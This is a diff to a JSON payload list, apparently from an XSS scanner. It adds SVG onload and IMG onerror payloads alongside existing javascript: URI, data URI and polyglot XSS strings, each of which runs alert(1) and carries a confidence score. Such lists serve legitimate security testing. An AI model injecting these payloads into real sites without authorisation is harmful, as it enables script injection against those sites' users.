@@ -21,6 +21,12 @@
       {"payload": "javascript:alert(1)",         "description": "Pseudo-protocol", "confidence_hint": 80},
       {"payload": "data:text/html,<script>alert(1)</script>", "description": "Data URI", "confidence_hint": 75}
     ],
+    "svg_context": [
+      {"payload": "<svg onload=alert(1)>", "description": "SVG onload", "confidence_hint": 85}
+    ],
+    "img_context": [
+      {"payload": "<img src=x onerror=alert(1)>", "description": "IMG onerror", "confidence_hint": 85}
+    ],
     "polyglot": [
       {"payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e", "description": "Polyglot XSS multi-contexte", "confidence_hint": 90}
     ]
